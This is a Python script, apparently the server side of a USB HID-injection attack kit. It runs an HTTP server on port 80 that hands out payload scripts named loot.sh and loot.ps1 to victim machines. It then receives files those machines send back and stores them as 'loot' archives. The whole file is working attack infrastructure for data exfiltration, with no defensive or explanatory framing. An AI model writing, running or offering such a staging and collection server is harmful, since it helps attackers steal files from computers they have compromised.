#!/usr/bin/env python3
import socket
import threading
import http.server
import socketserver
import os
import datetime

# --- Configuration ---
HTTP_PORT = 80
OUTPUT_DIR = "/sdcard/usb_exfil_loot"
# ---------------------

def get_timestamp():
    return datetime.datetime.now().strftime("%Y%m%d_%H%M%S")

def save_data(data):
    if not os.path.exists(OUTPUT_DIR):
        try:
            os.makedirs(OUTPUT_DIR)
        except OSError as e:
            print(f"[-] Error creating directory {OUTPUT_DIR}: {e}")
            return None

    timestamp = get_timestamp()
    extension = ".bin"
    
    # Simple magic byte check
    if data.startswith(b'PK'):
        extension = ".zip"
    elif data.startswith(b'\x1f\x8b'):
        extension = ".tar.gz"
        
    filename = f"loot_{timestamp}{extension}"
    filepath = os.path.join(OUTPUT_DIR, filename)
    
    try:
        with open(filepath, 'wb') as f:
            f.write(data)
        return filepath
    except Exception as e:
        print(f"[-] Error saving file: {e}")
        return None

def start_http_server():
    print(f"[*] Starting HTTP server on port {HTTP_PORT}...")
    # Ensure we serve files from the directory containing this script
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
    
    class LootRequestHandler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            if self.path == '/loot.sh':
                if os.path.exists('loot.sh'):
                    self.send_response(200)
                    self.send_header('Content-type', 'text/x-shellscript')
                    self.end_headers()
                    with open('loot.sh', 'rb') as f:
                        self.wfile.write(f.read())
                else:
                    self.send_error(404, "File not found")
            elif self.path == '/loot.ps1':
                if os.path.exists('loot.ps1'):
                    self.send_response(200)
                    self.send_header('Content-type', 'text/plain')
                    self.end_headers()
                    with open('loot.ps1', 'rb') as f:
                        self.wfile.write(f.read())
                else:
                    self.send_error(404, "File not found")
            else:
                self.send_error(403, "Access denied")

        def do_POST(self):
            try:
                content_length = int(self.headers.get('Content-Length', 0))
                if content_length > 0:
                    post_data = self.rfile.read(content_length)
                    filepath = save_data(post_data)
                    
                    self.send_response(200)
                    self.end_headers()
                    if filepath:
                        msg = f"File saved to {filepath}"
                        print(f"[+] HID Injection attack complete: {msg}")
                        self.wfile.write(msg.encode())
                    else:
                        self.wfile.write(b"Error saving file")
                else:
                    self.send_error(400, "No content")
            except Exception as e:
                print(f"[-] HTTP POST Error: {e}")
                self.send_error(500, str(e))

    class ThreadingTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
        allow_reuse_address = True

    try:
        with ThreadingTCPServer(("", HTTP_PORT), LootRequestHandler) as httpd:
            httpd.serve_forever()
    except OSError as e:
        print(f"[-] HTTP Server Error: {e}")

if __name__ == "__main__":
    start_http_server()
